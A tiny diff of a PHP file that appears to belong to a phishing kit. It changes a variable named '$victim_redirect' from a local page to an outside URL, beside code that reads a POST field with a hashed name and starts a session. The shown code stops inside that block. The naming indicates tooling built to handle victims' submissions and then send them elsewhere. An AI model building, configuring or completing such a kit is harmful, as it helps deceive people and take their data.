@@ -1,5 +1,5 @@
 <?php
-$victim_redirect = "./example.php";
+$victim_redirect = "https://mac.sa.com/6?ai=xd";
 $session = $_POST['e84c04c00c8e6f1117a0c7c603adab81'];
 if(isset($session)) {
     session_start();
